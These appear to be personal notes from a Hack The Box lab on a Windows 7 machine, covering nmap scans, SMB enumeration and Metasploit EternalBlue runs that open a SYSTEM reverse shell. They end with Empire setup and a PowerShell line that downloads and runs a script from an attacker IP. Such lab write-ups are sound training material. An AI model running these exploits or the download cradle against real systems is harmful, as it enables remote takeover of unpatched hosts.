# Nmap

#nmap 
```bash
> nmap -Pn -p- --min-rate 4000 10.10.10.40
Starting Nmap 7.97 ( https://nmap.org ) at 2025-08-26 14:35 +0700
Nmap scan report for 10.10.10.40
Host is up (0.17s latency).
Not shown: 65526 closed tcp ports (conn-refused)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
```

```bash
> nmap -Pn -p135,139,445 -sCV 10.10.10.40
Starting Nmap 7.97 ( https://nmap.org ) at 2025-08-26 14:36 +0700
Nmap scan report for 10.10.10.40
Host is up (0.17s latency).

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-08-26T07:37:00
|_  start_date: 2025-08-26T07:32:49
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-08-26T08:37:01+01:00
| smb2-security-mode:
|   2.1:
|_    Message signing enabled but not required
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: -19m56s, deviation: 34m35s, median: 1s
```

# smb shares list

#smbclient 
```bash
> smbclient -L 10.10.10.40

Password for [WORKGROUP\akhmadm]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Share           Disk
        Users           Disk
SMB1 disabled -- no workgroup available
```

# scan for MS17-010 Vulnerability

#metasploit
```bash
msf6 auxiliary(scanner/smb/smb_ms17_010) > set rhost 10.10.10.40
rhost => 10.10.10.40
msf6 auxiliary(scanner/smb/smb_ms17_010) > run
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

# run ms17_010_eternalblue

#metasploit 
```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost tun0
lhost => 10.10.14.5
msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.10.40
rhosts => 10.10.10.40
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
[*] Started reverse TCP handler on 10.10.14.5:4444
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)

<SNIPPED>

[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Sending stage (203846 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.14.5:4444 -> 10.10.10.40:49161) at 2025-08-26 14:45:55 +0700
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


meterpreter >
[*] 10.10.10.40 - Meterpreter session 1 closed.  Reason: Died
```

# run ms17_010_psexec

```bash
msf6 exploit(windows/smb/ms17_010_psexec) > set rhost 10.10.10.40
rhost => 10.10.10.40
msf6 exploit(windows/smb/ms17_010_psexec) > set lhost tun0
lhost => 10.10.14.5
msf6 exploit(windows/smb/ms17_010_psexec) > run
[*] Started reverse TCP handler on 10.10.14.5:4444
[*] 10.10.10.40:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
[-] 10.10.10.40:445 - Unable to find accessible named pipe!
[*] Exploit completed, but no session was created.
msf6 exploit(windows/smb/ms17_010_psexec) > run
[*] Started reverse TCP handler on 10.10.14.5:4444
[*] 10.10.10.40:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
[-] 10.10.10.40:445 - Unable to find accessible named pipe!
[*] Exploit completed, but no session was created.
```

# re-run ms17_010_eternalblue 

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
[*] Started reverse TCP handler on 10.10.14.5:4445
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.40:445 - The target is vulnerable.
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Sending stage (203846 bytes) to 10.10.10.40
[*] Meterpreter session 2 opened (10.10.14.5:4445 -> 10.10.10.40:49162) at 2025-08-26 14:52:04 +0700
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

[{2025-8-8} HTB_Cap]({2025-8-8}%20HTB_Cap.md)

# ippsec walkthrough

#ippsec
msf
```bash
❯ nmap -sCV -oA nmap-scripts 10.10.10.40
Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-27 10:44 +0700
Nmap scan report for 10.10.10.40
Host is up (0.17s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time:
|   date: 2025-09-27T03:45:35
|_  start_date: 2025-09-27T03:00:26
| smb2-security-mode:
|   2.1:
|_    Message signing enabled but not required
|_clock-skew: mean: -19m56s, deviation: 34m35s, median: 1s
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-09-27T04:45:38+01:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.94 seconds
```

```bash
$ locate ms17-010|grep .nse$

$ less /usr/share/nmap/scripts/smb-vuln-ms17-010.nse

$ grep -r categories /usr/share/nmap/scripts/

$ ❯ grep -r categories /usr/share/nmap/scripts/*.nse | grep -oP '".*?"'|sort -u
"auth"
"broadcast"
"brute"
"default"
"discovery"
"dos"
"exploit"
"external"
"fuzzer"
"info"
"intrusive"
"malware"
"safe"
"version"
"vuln"
```

## run nmap script vuln and safe

```bash
❯ nmap -p445 --script "vuln and safe" -Pn -n 10.10.10.40
Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-27 10:58 +0700
Nmap scan report for 10.10.10.40
Host is up (0.17s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

Nmap done: 1 IP address (1 host up) scanned in 3.52 seconds
```

## metasploit

```bash
msf exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf exploit(windows/smb/ms17_010_eternalblue) > set lhost tun0
lhost => tun0
msf exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.10.40
rhosts => 10.10.10.40
msf exploit(windows/smb/ms17_010_eternalblue) > exploit -j
[*] Exploit running as background job 0.
```

## Empire

```bash
git clone https://github.com/EmpireProject/Empire

cd Empire

git checkout dev

cd setup
./install.sh

cd ..
./empire

```

```cmd
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16/empire.ps1')"
```
